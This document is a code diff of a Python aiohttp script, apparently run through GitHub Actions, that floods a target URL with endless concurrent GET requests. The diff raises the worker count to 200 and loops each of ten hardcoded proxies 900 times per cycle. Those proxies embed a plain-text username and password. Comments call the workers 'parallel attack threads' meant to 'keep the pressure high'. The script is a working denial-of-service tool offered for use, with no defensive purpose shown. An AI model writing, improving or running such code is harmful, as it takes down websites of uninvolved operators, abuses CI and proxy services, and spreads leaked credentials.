@@ -1,68 +1,63 @@
 import asyncio
 import aiohttp
 import os
-import re
 import sys
 
-# Forces GitHub to show logs immediately
 def log(msg):
     print(f"{msg}", flush=True)
 
-class SparxCloudV11:
+class SparxEliteAuth:
     def __init__(self):
         self.target = os.environ.get("TARGET_URL", "")
-        self.proxies = []
         self.stats = {"success": 0, "failed": 0}
-        # 150 workers is the "Sweet Spot" for GitHub servers
-        self.concurrency = 150 
-
-    async def get_proxies(self, session):
-        log("🛰️ CONNECTING TO GLOBAL PROXY NODES...")
-        # High-speed API sources only
-        sources = [
-            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=500",
-            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
+        self.concurrency = 200 # Max power for GitHub servers
+        
+        # [span_3](start_span)Webshare Proxies with Auth[span_3](end_span)
+        # Format: http://username:password@ip:port
+        self.proxies = [
+            "http://nwllkxds:li0q0dyj1sdw@191.96.254.138:6185",
+            "http://nwllkxds:li0q0dyj1sdw@142.111.67.146:5611",
+            "http://nwllkxds:li0q0dyj1sdw@216.10.27.159:6837",
+            "http://nwllkxds:li0q0dyj1sdw@64.137.96.74:6641",
+            "http://nwllkxds:li0q0dyj1sdw@198.105.121.200:6462",
+            "http://nwllkxds:li0q0dyj1sdw@107.172.163.27:6543",
+            "http://nwllkxds:li0q0dyj1sdw@45.38.107.97:6014",
+            "http://nwllkxds:li0q0dyj1sdw@198.23.239.134:6540",
+            "http://nwllkxds:li0q0dyj1sdw@23.95.150.145:6114",
+            "http://nwllkxds:li0q0dyj1sdw@31.59.20.176:6754"
         ]
-        for url in sources:
-            try:
-                async with session.get(url, timeout=5) as resp:
-                    data = await resp.text()
-                    ips = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', data)
-                    self.proxies.extend(ips)
-            except: continue
-        log(f"✅ READY: {len(self.proxies)} Proxies Injected.")
 
     async def worker(self, session, sem):
         while True:
             for p in self.proxies:
-                async with sem:
-                    try:
-                        # Ultra-fast timeout to keep the pressure high
-                        async with session.get(self.target, proxy=f"http://{p}", timeout=3) as r:
-                            if r.status == 200:
-                                self.stats["success"] += 1
-                            else:
-                                self.stats["failed"] += 1
-                    except:
-                        self.stats["failed"] += 1
-                
-                # Update logs every 20 hits so you see the screen moving
-                if (self.stats["success"] + self.stats["failed"]) % 20 == 0:
-                    log(f"🚀 NITRO >> HITS: {self.stats['success']} | FAIL: {self.stats['failed']}")
+                # Loop each elite proxy 900 times per cycle
+                for _ in range(900):
+                    async with sem:
+                        try:
+                            async with session.get(self.target, proxy=p, timeout=5) as r:
+                                if r.status == 200:
+                                    self.stats["success"] += 1
+                                else:
+                                    self.stats["failed"] += 1
+                        except:
+                            self.stats["failed"] += 1
+                    
+                    if (self.stats["success"] + self.stats["failed"]) % 50 == 0:
+                        log(f"🚀 SPARX NITRO >> HITS: {self.stats['success']} | FAIL: {self.stats['failed']}")
 
     async def start(self):
         if not self.target:
-            log("❌ ERROR: TARGET_URL is empty!")
+            log("❌ ERROR: No target URL provided in GitHub Actions!")
             return
 
-        log(f"🔥 TARGET ACQUIRED: {self.target}")
-        sem = asyncio.Semaphore(self.concurrency)
+        log(f"🔥 ELITE CLOUD BURST ACTIVATED: {self.target}")
+        log(f"📡 NODES: {len(self.proxies)} Webshare Elite Proxies Authenticated.")
         
+        sem = asyncio.Semaphore(self.concurrency)
         async with aiohttp.ClientSession() as session:
-            await self.get_proxies(session)
             # Launch parallel attack threads
             tasks = [self.worker(session, sem) for _ in range(self.concurrency)]
             await asyncio.gather(*tasks)
 
 if __name__ == "__main__":
-    asyncio.run(SparxCloudV11().start())
+    asyncio.run(SparxEliteAuth().start())
